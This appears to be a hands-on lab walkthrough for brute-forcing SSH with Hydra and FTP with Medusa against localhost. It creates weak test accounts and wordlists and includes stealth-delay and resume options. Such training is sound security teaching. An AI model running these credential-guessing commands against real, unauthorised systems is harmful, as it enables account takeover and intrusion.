Task 1: SSH Brute-Force with Hydra
Step 1.1: Verify Installation and Setup
# Check Hydra installation
hydra -h

# Verify SSH service is running
sudo systemctl status ssh

# If SSH is not running, start it
sudo systemctl start ssh
Step 1.2: Create Test Environment
# Create test users with weak passwords
sudo useradd -m testuser1
sudo useradd -m admin
echo 'testuser1:password123' | sudo chpasswd
echo 'admin:admin' | sudo chpasswd

# Create wordlist directory
mkdir ~/wordlists
cd ~/wordlists

# Create username wordlist
cat > usernames.txt << EOF
admin
testuser1
root
user
guest
EOF

# Create password wordlist
cat > passwords.txt << EOF
admin
password
123456
password123
root
test
EOF
Step 1.3: Execute Basic Hydra Attacks
# Single credential test
hydra -l admin -p admin ssh://127.0.0.1

# Wordlist-based attack
hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt ssh://127.0.0.1

# Verbose output with threading control
hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -t 4 -V ssh://127.0.0.1

# Save results to file
hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -o ssh_results.txt ssh://127.0.0.1
Step 1.4: Advanced Hydra Options
# Add delay between attempts (stealth mode)
hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -t 2 -w 3 ssh://127.0.0.1

# Custom port specification
hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -s 2222 ssh://127.0.0.1

# Resume interrupted attack
hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -R ssh://127.0.0.1
Task 2: FTP Brute-Force with Medusa
Step 2.1: Configure FTP Service
# Install FTP server
sudo apt install vsftpd -y

# Configure vsftpd for testing
sudo tee /etc/vsftpd.conf > /dev/null << EOF
listen=YES
local_enable=YES
write_enable=YES
chroot_local_user=YES
allow_writeable_chroot=YES
EOF

# Restart FTP service
sudo systemctl restart vsftpd
sudo systemctl enable vsftpd
Step 2.2: Install and Verify Medusa
# Install Medusa
sudo apt install medusa -y

# View help and available modules
medusa -h
medusa -d
Step 2.3: Execute Medusa Attacks
# Basic FTP attack
medusa -h 127.0.0.1 -u testuser1 -p password123 -M ftp

# Wordlist attack with verbose output
medusa -h 127.0.0.1 -U ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -M ftp -v 6

# Save results and control threading
medusa -h 127.0.0.1 -U ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -M ftp -t 5 -O ftp_results.txt

# Resume attack from checkpoint
medusa -h 127.0.0.1 -U ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -M ftp -Z h1u1p1
